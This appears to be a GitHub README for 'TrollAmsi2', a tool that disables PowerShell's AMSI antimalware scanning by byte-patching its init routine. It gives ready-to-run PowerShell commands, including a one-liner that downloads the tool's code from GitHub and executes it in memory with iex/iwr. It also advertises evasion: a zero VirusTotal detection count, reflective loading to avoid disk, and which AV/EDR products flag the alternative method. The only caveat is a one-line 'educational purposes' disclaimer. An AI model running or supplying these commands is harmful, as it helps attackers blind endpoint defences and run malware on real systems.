# TrollAmsi2
Bypass powershell amsi by "byte patching" the init method -> basically break it. <br>
Afterwhich, we manually call UnInit and when it retries to re-Init properly, it fails <br>

**DLL Method**
- This is the preferred method which uses HarmonyLib 
- compile TrollAmsi2.cs into a .dll and use with 0Harmony.dll (Both are 0/72 on virus total and clean on hybrid-analysis) 
- If you are concerned with dropping on disk, ofcourse you can reflectively load 

**powershell one liner**
- Use trollamsi2.ps1 
- Not as stealthy as TrollAMSI due to the use of VirtualProtect which gets flagged by some AV/EDRs during the $lib add-type 
  
## Usage 
```
#DLL method 
$assembly = [System.Reflection.Assembly]::LoadFrom("C:\0Harmony.dll")
$code = (iwr https://github.com/cybersectroll/TrollAmsi2/raw/refs/heads/main/TrollAmsi2.cs -UseBasicParsing).content
Add-Type -TypeDefinition $code -ReferencedAssemblies "C:\0Harmony.dll"
[TrollAmsi2]::SmokeOut()

#powershell one liner
iex(iwr https://raw.githubusercontent.com/cybersectroll/TrollAMSI2/refs/heads/main/TrollAmsi2.cs -UseBasicParsing).content
```

## MIT License for HarmonyLib
MIT License

Copyright (c) 2017 Andreas Pardeike

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

## Disclaimer
Should only be used for educational purposes!
